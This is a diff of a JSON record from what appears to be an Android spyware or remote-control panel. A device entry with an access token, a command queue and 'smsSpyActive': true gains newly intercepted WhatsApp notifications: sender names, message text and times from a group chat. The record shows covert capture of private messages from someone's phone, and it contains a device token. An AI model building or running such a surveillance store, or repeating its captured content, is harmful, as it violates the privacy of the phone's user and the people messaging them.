@@ -2766,7 +2766,7 @@
     "deviceName": "HP-FREE-E7C4",
     "ownerUsername": "rian",
     "token": "3edb01b0f7a259097d52c5b4fdd50348",
-    "lastSeen": 1775201088521,
+    "lastSeen": 1775201094534,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-03T07:22:21.597Z",
@@ -2782,6 +2782,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝐆𝐁 𝐈𝐒𝐈𝐀𝐍 𝐊𝐢𝐧𝐠 𝐑𝐢𝐜𝐲 [1]",
+        "content": "‎129 pesan baru",
+        "time": "03/04 14:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201094872
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐆𝐁 𝐈𝐒𝐈𝐀𝐍 𝐊𝐢𝐧𝐠 𝐑𝐢𝐜𝐲 [1] (129 pesan): ~ nopall",
+        "content": "22 2-3k kayu fpt",
+        "time": "03/04 14:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775201094865
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝐆𝐁 𝐈𝐒𝐈𝐀𝐍 𝐊𝐢𝐧𝐠 𝐑𝐢𝐜𝐲 [1] (128 pesan): ~ nopall",
